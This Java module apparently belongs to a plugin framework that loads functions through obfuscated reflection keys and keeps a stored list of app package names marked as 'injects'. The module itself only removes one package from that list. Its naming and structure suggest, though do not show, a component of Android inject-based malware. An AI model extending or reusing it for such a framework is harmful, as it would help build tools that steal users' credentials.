package com.moonny.mods_src;

import org.json.JSONObject;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Repeat_inject {

    public int MAIN_VER_REQUIRED = 100; // minimum Main api version required
    private Object mods;
    private Method run_func;

    public Repeat_inject(HashMap<String, Object> system) throws Exception
    {
        this.mods = system.get("a4");
        this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
    }

    public JSONObject run(JSONObject params) throws Exception {

        String package_name = params.getString("p");

        // pkg1|pkg2|pkg3
        String filled_injects = (String) run_func.invoke(mods, "main", "get_pref", new Object[]{"p1", ""});
        String injects_updated = (String) run_func.invoke(mods, "main", "list_remove", new Object[]{filled_injects, package_name});
        run_func.invoke(mods, "main", "set_pref", new Object[]{"p1", injects_updated});

        return null;
    }

}
